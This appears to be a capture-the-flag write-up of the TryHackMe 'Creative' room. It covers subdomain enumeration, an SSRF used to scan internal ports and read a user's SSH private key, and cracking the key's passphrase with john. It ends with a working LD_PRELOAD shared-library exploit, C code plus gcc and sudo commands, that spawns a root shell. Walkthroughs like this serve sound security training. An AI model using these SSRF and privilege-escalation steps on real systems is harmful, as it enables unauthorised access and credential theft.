### Introduction
HelloðŸ‘‹ Today we're going to take a look at [Creative](./https://tryhackme.com/r/room/creative) room on TryHackMe by sSaadakhtarr. The difficulty is easy.

We'll have to start by adding the target IP Adress to our ```/etc/hosts``` use nano or vim to edit this.
```bash
[YOUR_TARGET_IP] creative.thm
```
We can now take a look at the website ```http://creative.thm```. It looks like a simple html website.

### Enumeration
We'll just start off with a simple Nmap scan. We see that the ports 22 and 80 are open.
![Screenshot 2](./2.webp)

Let's try to find some directories with Gobuster.
```bash
gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirbuster/direcotry-list-lowercase-2.3-medium.txt
```
![Screenshot 3](./3.webp)
Hmmm nothing interesting there. Let's try subdomains.
```bash
gobuster vhost -u http://creative.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain creative.thm
```
![Screenshot 4](./4.webp)
We found something. Let's check it out. Add ```beta.creative.thm``` to your ```/etc/hosts```.
![Screenshot 5](./5.webp)

Ok, it explains what it does. Let's test it! I have created a test.txt and setup a python http server.
![Screenshot 7](./7.webp)
![Screenshot 6](./6.webp)
And it connects! We can see that it sends a GET request and on the website it displays the test.txt.
![Screenshot 8](./26.webp)

Let's try and see if we can connect to the localhost (127.0.0.1) of the website.
![Screenshot 8](./8.webp)
Which returns the content of the page.
![Screenshot 9](./9.webp)

Now let's try to see if there are any ports that are not accesible from the outside. We'll use ```ffuf``` for this. But we first need to make a ports.txt we can do that with ```seq```.
```bash
seq 65535 > ports.txt
```

```bash
ffuf -u http://beta.creative.thm/ -w ports.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "url=http://localhost:FUZZ" -fw 3
```
![Screenshot 10](./10.webp)
And we got a open port 1337!

### Getting Access
Now, with the ```http://localhost:1337/``` payload on ```http://beta.creative.thm```, we are able to get the contents of the web server.

![Screenshot 12](./12.webp)

Let's try going to ```/home``` and see what users we got.
![Screenshot 13](./13.webp)

We get a user called Saad. Let's go into Saad's home folder.
![Screenshot 14](./14.webp)

We can see that Saad has a .ssh folder.
![Screenshot 15](./15.webp)

Let's get Saad ```id_rsa```
![Screenshot 16](./16.webp)

To get the correct formatting of the ```id_rsa``` (to not get any errors when logging in with ssh), you'll have to view page source and then copy the contents of the ```id_rsa```.
![Screenshot 17](./17.webp)

After having copied the ```id_rsa``` we have to give 600 permission to the ```id_rsa```.

![Screenshot 18](./18.webp)

Looks like we need a passphrase. We can use ```john``` to get the password but we first have to convert the ```id_rsa``` to a .hash with ```ssh2john``` like so.
```bash 
ssh2john id_rsa > id_rsa.hash
```
![Screenshot 19](./19.webp)

```bash 
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Screenshot 20](./20.webp)

Nice! We got the passphrase, now we can ssh into Saad.

![Screenshot 21](./21.webp)

And we're able to get the first flag ðŸ˜ƒ

![Screenshot 22](./22.webp)

### Privilege Escalation
After looking a bit around I found Saad's password in the **.bash_history**.
![Screenshot 23](./23.webp)

We can then see what privileges we have with ```sudo -L```.
![Screenshot 24](./24.webp)
We see that Saad can run ```ping``` as root, but we can't do much with ```ping```. If we look closely on the ```sudo -L``` output, we can see that it contains:
```bash
env_keep+=LD_PRELOAD
```

The ```LD_PRELOAD``` environment variable is used to specify shared libraries that should be loaded before others when a program is run. This allows us to override functions in existing libraries. We can leverage this feature to inject malicious code into a process running with elevated privileges. 

```c
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	system("/bin/sh");
}
```
Next we'll have to compile it.
```bash
gcc -fPIC -shared -o escalate.so escalate.c -nostartfiles
```

Finally, we run the ```ping``` command with our ```LD_PRELOAD``` variable pointing to our malicious library
```bash
sudo LD_PRELOAD=/tmp/escalate.so /usr/bin/ping
```

And we get root and are able to get the second flag ðŸ¥³ This was a fun room, hope you learned something from this write-up. Happy Hacking!
